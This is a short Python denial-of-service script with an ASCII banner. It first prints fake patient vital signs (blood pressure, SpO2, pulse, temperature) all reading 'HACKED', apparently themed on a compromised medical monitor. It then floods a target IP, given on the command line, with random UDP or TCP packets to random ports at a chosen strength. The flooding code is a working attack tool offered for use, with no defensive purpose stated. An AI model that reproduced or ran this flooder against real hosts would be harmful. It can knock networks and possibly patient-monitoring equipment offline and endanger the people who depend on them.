# Map

###
import socket, sys, random

def banner():
    banner = """[91m
         ███▄ ▄███▓▓█████▄  ██░ ██ 
        ▓██▒▀█▀ ██▒▒██▀ ██▌▓██░ ██▒
        ▓██    ▓██░░██   █▌▒██▀▀██░
        ▒██    ▒██ ░▓█▄   ▌░▓█ ░██ 
        ▒██▒   ░██▒░▒████▓ ░▓█▒░██▓
        ░ ▒░   ░  ░ ▒▒▓  ▒  ▒ ░░▒░▒
        ░  ░      ░ ░ ▒  ▒  ▒ ░▒░ ░
        ░      ░    ░ ░  ░  ░  ░░ ░
        ░      ░     ░  ░  ░
                        ░             
    [0m"""
    print(banner)

def simulate_hacked_data():
    # Simulating vital signs all set to "HACKED"
    vital_signs = {
        "NIBP": {"Systolic": "HACKED", "Diastolic": "HACKED"},
        "SpO2": "HACKED",
        "PR": "HACKED",
        "Temp": "HACKED",
    }

    print("\nSimulated Vital Signs (HACKED):")
    print("-------------------------------")
    print(f"Blood Pressure: {vital_signs['NIBP']['Systolic']}/{vital_signs['NIBP']['Diastolic']}")
    print(f"SpO2: {vital_signs['SpO2']}")
    print(f"Pulse Rate: {vital_signs['PR']}")
    print(f"Temperature: {vital_signs['Temp']}")
    print("-------------------------------")
    print("All values indicate a potential system compromise. Immediate attention required!\n")

def flood(ip, protocol, strength):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if protocol == 'udp' else socket.SOCK_STREAM)
    data = random._urandom(1024 * strength)
    total_packets = strength * 10000000  

    try:
        for i in range(total_packets):
            try:
                if protocol == 'tcp':
                    client.connect((ip, random.randint(1, 65535)))
                client.sendto(data, (ip, random.randint(1, 65535)))
            except:
                pass
            
            progress = (i + 1) / total_packets
            bar_length = 50  
            filled_length = int(bar_length * progress)
            bar = '█' * filled_length + '-' * (bar_length - filled_length)
            print(f"\r|{bar}| {progress * 100:.2f}%", end="")
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    banner()
    simulate_hacked_data()  # Add hacked data simulation here

    if len(sys.argv) != 4:
        print("Usage: python script.py <ip> <protocol> <strength (1-5)>")
        sys.exit(1)

    _, ip, protocol, strength = sys.argv
    strength = int(strength)
    if strength < 1 or strength > 5:
        print("Strength must be between 1 and 5")
        sys.exit(1)

    flood(ip, protocol, strength)
